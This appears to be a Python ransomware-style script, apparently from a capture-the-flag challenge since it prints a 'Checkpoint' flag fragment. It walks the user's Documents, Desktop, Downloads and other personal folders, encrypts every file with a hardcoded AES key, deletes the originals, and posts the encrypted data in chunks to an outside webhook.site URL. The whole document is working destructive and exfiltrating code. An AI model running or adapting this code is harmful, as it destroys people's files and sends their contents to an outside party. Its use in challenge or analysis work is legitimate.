import os
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

AES_KEY = b'\xff\x3d\xae\x3b\xcc\xef\x12\x44\xff\x3d\xae\x3b\xcc\xef\x12\x44'
timestamp = int(datetime.now().timestamp())
IV = timestamp.to_bytes(16, byteorder='big')

dirs = ['Documents', 'Desktop', 'Downloads', 'Pictures', 'Videos', 'Music']
base_path = os.path.expandvars(r'%USERPROFILE%')
print("Base Path:", base_path)

def procFile(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        ct = AES.new(AES_KEY, AES.MODE_CBC, IV)
        datas = ct.encrypt(pad(data, AES.block_size))
        
        encDatas = base64.b64encode(datas)

        stream_datas = encDatas.hex()
        chunks = [stream_datas[i:i+256] for i in range(0, len(stream_datas), 256)]
        os.remove(file_path)
        
        for chunk in chunks:
            url = f'http://webhook.site/f3ef69c6-ffd2-483e-a1e7-06fa1f5e79cd?data={chunk}'
            requests.post(url)
        
        print(f"{file_path}")
        print("Checkpoint 2: Y2hhbGxfc2ltcGxlXw==")
    except Exception as e:
        print(f"{file_path}: {e}")

def procDir():
    for dir_name in dirs:
        dir_path = os.path.join(base_path, dir_name)
        if os.path.exists(dir_path):
            for root, _, files in os.walk(dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    procFile(file_path)

if __name__ == "__main__":
    procDir()
